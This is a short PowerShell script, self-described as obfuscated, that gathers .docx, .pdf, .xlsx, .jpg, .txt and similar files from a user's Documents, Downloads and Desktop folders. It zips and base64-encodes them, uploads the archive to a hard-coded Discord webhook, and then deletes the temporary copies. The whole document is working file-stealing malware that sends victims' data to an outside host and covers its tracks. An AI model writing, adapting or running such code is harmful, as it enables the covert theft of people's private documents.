# Obfuscated script to collect and send files
$tgtFolders = @("$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Desktop") # Target folders
$tmpFolder = "$env:TEMP\FileUpload" # Temporary folder
New-Item -Path $tmpFolder -ItemType Directory -Force | Out-Null

# Collect .docx, .pdf, .wps, and other files
$fileTypes = @(".docx", ".pdf", ".wps", ".xlsx", ".jpg", ".txt") # Add more file types if needed
$tgtFolders | ForEach-Object {
    $folder = $_
    $fileTypes | ForEach-Object {
        Get-ChildItem -Path $folder -Filter $_ -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
            Copy-Item -Path $_.FullName -Destination $tmpFolder -Force
        }
    }
}

# Compress files into a .zip archive
$zipFile = "$env:TEMP\Files.zip"
Compress-Archive -Path "$tmpFolder\*" -DestinationPath $zipFile -Force

# Encode the .zip file in Base64
$fileBytes = [System.IO.File]::ReadAllBytes($zipFile)
$fileBase64 = [System.Convert]::ToBase64String($fileBytes)

# Send the Base64-encoded file to Discord
$webhookUrl = "https://discord.com/api/webhooks/1334812652823642204/uhy1mRr1neECnYelQKTSUcqjqFgAIo0fbFBJKgvs_ak1HaxlkDvx5Oa7v_ZQzdXzT6qL" # Replace with your webhook URL
$payload = @{
    content = "*File Archive:*"
    file    = $fileBase64
    username = "FileUploadBot"
} | ConvertTo-Json
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"

# Clean up
Remove-Item -Path $tmpFolder -Recurse -Force
Remove-Item -Path $zipFile -Force